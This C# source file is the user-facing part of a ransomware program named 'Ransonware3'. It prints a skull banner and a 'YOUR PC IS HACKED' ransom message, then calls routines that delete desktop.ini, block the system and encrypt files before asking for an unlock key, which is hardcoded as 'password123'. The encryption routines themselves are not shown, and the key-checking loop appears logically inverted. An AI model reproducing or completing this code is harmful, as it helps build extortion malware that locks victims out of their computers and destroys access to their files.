using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Ransonware3
{
    class View
    {
        public static void Skull()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;

            Console.WriteLine("YOU LOSE YOUR PC...");
            Console.WriteLine("                   :::!~!!!!!:.\r\n                " +
                              "  .xUHWH!! !!?M88WHX:.\r\n           " +
                              "     .X*#M@$!!  !X!M$$$$$$WWx:.\r\n" +
                              "               :!!!!!!?H! :!$!$$$$$$$$$$8X:\r\n" +
                              "              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:\r\n" +
                              "             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!\r\n" +
                              "             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!\r\n" +
                              "               !:~~~ .:!M\"T#$$$$WX??#MRRMMM!\r\n" +
                              "               ~?WuxiW*`   `\"#$$$$8!!!!??!!!\r\n" +
                              "             :X- M$$$$       `\"T#$T~!8$WUXU~\r\n" +
                              "            :%`  ~#$$$m:        ~!~ ?$$$$$$\r\n" +
                              "          :!`.-   ~T$$$$8xx.  .xWW- ~\"\"##*\"\r\n" +
                              ".....   -~~:<` !    ~?T#$$@@W@*?$$      /`\r\n" +
                              "W$@@M!!! .!~~ !!     .:XUW$W!~ `\"~:    :\r\n" +
                              "#\"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`\r\n" +
                              ":::~:!!`:X~ .: ?H.!u \"$$$B$$$!W:U!T$$M~\r\n" +
                              ".~~   :X@!.-~   ?@WTWo(\"*$$$W$TH$! `\r\n" +
                              "Wi.~!X$?!-~    : ?$$$B$Wu(\"**$RM!\r\n" +
                              "$R@i.~~ !     :   ~$$$$$B$$en:``\r\n" +
                              "?MXT@Wx.~    :     ~\"##*$$$$M~\r\n");
        }

        public static void MenuView()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("//////////////////////");
            Console.WriteLine("  YOUR PC IS HACKED");
            Console.WriteLine("/////////////////////");
            Console.WriteLine("VISIT: FOLLOW THE INSTRUCTIONS TO GET THE KEY");
            Console.WriteLine("WRITE THE KEY THE GET YOUR PC FREE: ");
        }

        public static void Load()
        {
            Ransonware rw = new Ransonware();
            string password = "";
            try
            {
                Skull();
                rw.Ransonware3_Load();
                rw.DeleteDesktopIni();
                rw.BlockSystem();
                rw.CallEncrypt();
                do
                {
                    MenuView();
                    password = Console.ReadLine();
                    rw.Key(password);
                } while (password == "password123");
            }
            catch 
            {
                Console.WriteLine("");
            }
        }
    }

    
}

namespace MyNamespace
{
    
}
